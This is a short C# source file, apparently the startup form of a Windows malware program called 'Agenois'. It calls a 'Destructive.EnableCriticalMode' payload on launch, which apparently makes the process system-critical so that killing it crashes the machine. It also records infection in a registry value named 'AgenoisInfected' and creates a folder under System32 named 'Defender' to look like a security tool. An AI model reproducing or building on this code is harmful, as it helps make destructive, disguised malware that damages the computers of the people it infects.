using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using System.IO;
using System.Threading;
using System.Diagnostics;
using Agenois.Properties;
using Agenois.Payloads;
using Agenois.Utils;
using System.Media;

namespace Agenois
{
    public partial class MainThread : Form
    {
        public MainThread()
        {
            InitializeComponent();

            //Everything on startup.

            Destructive.EnableCriticalMode();

            RegistryKey editKey;

            if (Process.GetProcessesByName("Agenois").Count() > 1) { Environment.Exit(0); }

            string extractPath = @"C:\Windows\System32\Defender";

            if (Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Agenois", "AgenoisInfected", null) == null)
            {
                Directory.CreateDirectory(extractPath);
            }
        }

        private void MainThread_Load(object sender, EventArgs e)
        {
            //Everything on startup.
            Payloads.Destructive.EnableCriticalMode();
        }
    }
}
